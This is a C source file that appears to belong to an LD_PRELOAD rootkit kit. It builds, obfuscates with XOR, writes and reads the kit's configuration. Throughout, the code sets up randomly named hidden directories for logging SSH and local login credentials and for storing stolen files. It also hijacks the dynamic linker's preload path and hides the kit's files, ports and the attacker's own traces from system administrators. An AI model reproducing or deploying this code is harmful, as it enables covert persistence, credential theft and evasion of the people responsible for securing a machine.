#define inithideports(BC) do{ \
    for(u_int i=0; i < MAX_HIDE_PORTS; i++) \
        BC->hideports[i] = 0; \
    u_int psize = BDVLPORTS_SIZE;  /* don't try to store greater than max possible hideports. */  \
    psize>MAX_HIDE_PORTS ? psize=MAX_HIDE_PORTS : 0; \
    for(u_int i=0; i < psize; i++)  /* set defaults. */  \
        BC->hideports[i] = bdvlports[i]; \
    BC->portcount = psize; \
} while(0)

void __attribute((visibility("hidden"))) inittimes(bdvcfg_t *bc, time_t t){
    time_t *bimes[] = {
        #if defined USE_MAGIC_ATTR && defined ATTRCHANGETIME
         &bc->attrchangetime,
        #endif
        #if defined FILE_STEAL && defined FILE_CLEANSE_TIMER
         &bc->filecleantime,
        #endif
         &bc->installtime,
         &bc->idchangetime
    };

    for(u_int i=0; i<sizeofarr(bimes); i++)
        *bimes[i]=t;
}

#define _getvar(BC,DEST,DSIZE,FN,...) do{ \
    usleep(75000); \
    char *res = FN(__VA_ARGS__); \
    if(!res){ \
        bree(BC); \
        return NULL; \
    } \
    memset(DEST, 0, DSIZE); \
    strncpy(DEST, res, DSIZE); \
    clean(res); \
    xor(DEST); \
} while(0)
#define getvar(BC,DEST,FN,...) _getvar(BC,DEST,sizeof(DEST),FN,__VA_ARGS__)

/* get all random & specifically unimportant paths for the kit.
 * NULL is returned on failure. on success the given pointer is returned. */
bdvcfg_t __attribute((visibility("hidden"))) *getbdvpaths(bdvcfg_t *bc){
    char *randdests[] = {
        #ifdef LOG_SSH
         bc->sshlogs,
        #endif
        #ifdef FILE_STEAL
         bc->interestdir,
        #endif
        #ifdef LOG_LOCAL_AUTH
         bc->logpath,
        #endif
        #ifdef HIDE_MY_ASS
         bc->asspath,
        #endif
         bc->installdir,
         bc->homedir
    };

    for(int i=0; i < sizeofarr(randdests); i++)
        _getvar(bc, randdests[i], PATHMAX, (*randpath), _randnum(14, 18), NULL);
    return bc;
}

/* the result of this function is a fresh bdvcfg_t pointer, for immediate writing by writebdvcfg. */
bdvcfg_t *getbdvcfg(void){
    bdvcfg_t *ret = malloc(sizeof(bdvcfg_t));
    if(!ret) return NULL;
    memset(ret, 0, sizeof(bdvcfg_t));
    srand(time(NULL));

    getbdvpaths(ret);
    getvar(ret, ret->bdvlso, (*randso), ret->installdir);
    getvar(ret, ret->bdvar, (*randvar), 16);
#ifdef LDPATCH
    getvar(ret, ret->preloadpath, (*randpath), 18, "/lib");
#else
    getvar(ret, ret->preloadpath, (*xordup), OLD_PRELOAD);
#endif
#ifdef STOLEN_STORAGE
    getvar(ret, ret->storedest, (*xordup), STOLEN_STORAGE);
#endif
#ifdef USE_MAGIC_ATTR
    getvar(ret, ret->magicattr, (*randgarb), MAGICATTRLEN);
#endif
    ret->magicid = randid();
    inittimes(ret, time(NULL));
    inithideports(ret);
    return ret;
}



/* write (already xor'd) bdvcfg_t to path. 0 or -1 is returned on failure & path unlinked.
 * if path is NULL then CFGPATH is the default target path. */
size_t writebdvcfg(bdvcfg_t *bc, const char *path){
    FILE *fp;
    size_t ret;
    char *target;

    if(path == NULL)
        target = xordup(CFGPATH);
    else target = strdup(path);

    hook(CFOPEN, CFWRITE, CCHMOD);

    fp = call(CFOPEN, target, "wb");
    if(fp == NULL){
        clean(target);
        return 0;
    }
    ret = (size_t)call(CFWRITE, bc, 1, sizeof(bdvcfg_t), fp);
    fflush(fp);
    fclose(fp);

    if(!ret) rm(target);
    else{
        chownpath(target, bc->magicid);
        call(CCHMOD, target, 0666);
    }
    clean(target);
    return ret;
}

void xorbdvcfg(bdvcfg_t *bc){
    char *uxor[] = {      /* all strings stored & that need xor'd */
        #ifdef LOG_SSH
         bc->sshlogs,
        #endif
        #ifdef FILE_STEAL
         bc->interestdir,
        #endif
        #ifdef LOG_LOCAL_AUTH
         bc->logpath,
        #endif
        #ifdef HIDE_MY_ASS
         bc->asspath,
        #endif
        #if defined FILE_STEAL && defined STOLEN_STORAGE
         bc->storedest,
        #endif
        #ifdef USE_MAGIC_ATTR
         bc->magicattr,
        #endif
         bc->installdir,
         bc->homedir,
         bc->preloadpath,
         bc->bdvlso,
         bc->bdvar
    };

    for(int i=0; i < sizeofarr(uxor); i++)
        xor(uxor[i]);
}

#ifdef HIDE_MY_ASS
/* returns an array of things that HIDE_MY_ASS does not need to track. */
char **notracks(int *c){
    bdvcfg_t *bc = readbdvcfg(NULL);
    if(!bc) return NULL;

    char *ntrack[] = {
        #ifdef LOG_SSH
         bc->sshlogs,
        #endif
        #ifdef FILE_STEAL
         bc->interestdir,
        #endif
        #ifdef LOG_LOCAL_AUTH
         bc->logpath,
        #endif
        #ifdef HIDE_MY_ASS
         bc->asspath,
        #endif
         bc->installdir,
         bc->homedir,
         bc->preloadpath,
         "/proc", "/root",
         "/tmp"
    };

    int x = sizeofarr(ntrack), i;
    size_t s;
    char **ret = calloc(x, sizeof(char*));
    if(!ret){
        bree(bc);
        return NULL;
    }
    for(i=0; i<x; i++){
        s = strlen(ntrack[i])+1;
        ret[i] = malloc(s);
        if(!ret[i]){
            free(ret);
            bree(bc);
            return NULL;
        }
        memset(ret[i], 0, s);
        strncpy(ret[i], ntrack[i], s);
    }
    bree(bc);
    *c=i;
    return ret;
}
#endif


/* reads bdvcfg_t from path. unxors each string. returns pointer to populated struct.
 * NULL is returned if either:   path could not be opened,
 *                               could not allocate memory for bdvcfg_t,
 *                               bytes read is <1.
 * if path is NULL, the target is assumed to be CFGPATH. */
bdvcfg_t *readbdvcfg(const char *path){
    FILE *fp;

    char *target;
    if(path == NULL)
        target = xordup(CFGPATH);
    else target = strdup(path);
    hook(CFOPEN, CFREAD);
    fp = call(CFOPEN, target, "rb");
    clean(target);

    if(fp == NULL)
        return NULL;

    bdvcfg_t *ret = malloc(sizeof(*ret));
    if(!ret){
        fclose(fp);
        return NULL;
    }
    memset(ret, 0, sizeof(*ret));

    size_t n = (size_t)call(CFREAD, ret, 1, sizeof(*ret), fp);
    fflush(fp);
    fclose(fp);
    if(!n){
        free(ret);
        return NULL;
    }

    xorbdvcfg(ret);
    return ret;
}



/* each char pointer array in the functions below must remain in order respective of each other for the correct intended behaviour. */
/* returns an array of link names for items linked to within homedir. */
char **bdvlinkdests(int *c, bdvcfg_t *abc){
    bdvcfg_t *bc;
    if(abc == NULL)
        bc = readbdvcfg(NULL);
    else bc = abc;
    if(!bc) return NULL;

    char **ret;
    char *dest[] = {
        #ifdef LOG_SSH
         "%s/ssh",
        #endif
        #ifdef FILE_STEAL
         "%s/interest",
        #endif
        #ifdef LOG_LOCAL_AUTH
         "%s/auth",
        #endif
        #ifdef HIDE_MY_ASS
         "%s/ass",
        #endif
         "%s/install"
    };

    int x = sizeofarr(dest), i;
    size_t s;
    ret = calloc(x, sizeof(char*));
    if(!ret){
        !abc ? bree(bc) : 0;
        return NULL;
    }
    for(i=0; i<x; i++){
        s = strlen(dest[i])+strlen(bc->homedir)+2;
        ret[i] = malloc(s);
        if(!ret[i]){
            !abc ? bree(bc) : 0;
            if(i != 0)
                for(int j=0; j<i; j++)
                    clean(ret[i]);
            free(ret);
            return NULL;
        }
        memset(ret[i], 0, s);
        snprintf(ret[i], s, dest[i], bc->homedir);
    }
    !abc ? bree(bc) : 0;
    *c=i;
    return ret;
}
/* if abc is NULL CFGPATH is read from upon calling & the resulting pointer freed.
 * returns an array of all paths to be linked to within homedir. */
char **bdvlinksrcs(int *c, bdvcfg_t *abc){
    bdvcfg_t *bc;
    if(abc == NULL)
        bc = readbdvcfg(NULL);
    else bc = abc;
    if(!bc) return NULL;

    char *linksrc[] = {
        #ifdef LOG_SSH
         bc->sshlogs,
        #endif
        #ifdef FILE_STEAL
         bc->interestdir,
        #endif
        #ifdef LOG_LOCAL_AUTH
         bc->logpath,
        #endif
        #ifdef HIDE_MY_ASS
         bc->asspath,
        #endif
         bc->installdir
    };

    int x = sizeofarr(linksrc), i;
    size_t s;
    char **ret = calloc(x, sizeof(char*));
    if(!ret){
        !abc ? bree(bc) : 0;
        return NULL;
    }
    for(i=0; i<x; i++){
        s = strlen(linksrc[i])+1;
        ret[i] = malloc(s);
        if(!ret[i]){
            !abc ? bree(bc) : 0;
            if(i != 0)
                for(int j=0; j<i; j++)
                    clean(ret[i]);
            free(ret);
            return NULL;
        }
        memset(ret[i], 0, s);
        strncpy(ret[i], linksrc[i], s);
    }
    !abc ? bree(bc) : 0;
    *c=i;
    return ret;
}


/* bc should point to an already populated & unxor'd bdvcfg_t.
 * all kit paths are hidden with newid & if enabled, your oldid ass is hidden. */
void hidebdvpaths(bdvcfg_t *bc, id_t newid, id_t oldid, char *oldattr){
    char *bdvpaths[] = {
        #ifdef LOG_SSH
         bc->sshlogs,
        #endif
        #ifdef FILE_STEAL
         bc->interestdir,
        #endif
        #ifdef LOG_LOCAL_AUTH
         bc->logpath,
        #endif
        #ifdef HIDE_MY_ASS
         bc->asspath,
        #endif
         bc->installdir,
         bc->homedir
    };

    doiapath(bc->preloadpath, 0);
#ifdef USE_MAGIC_ATTR
    attrmodif(bc, bc->preloadpath, CSETXATTR);
#else
    chownpath(bc->preloadpath, newid);
#endif
    while(!doiapath(bc->preloadpath, 1));

    int x = sizeofarr(bdvpaths);
    for(int i=0; i<x; i++){
#ifdef USE_MAGIC_ATTR
        attrmodif(bc, bdvpaths[i], CSETXATTR);
#else
        chownpath(bdvpaths[i], newid);
#endif
    }
#ifdef HIDE_MY_ASS
    hidemyass(bc, oldid, oldattr);
#endif
}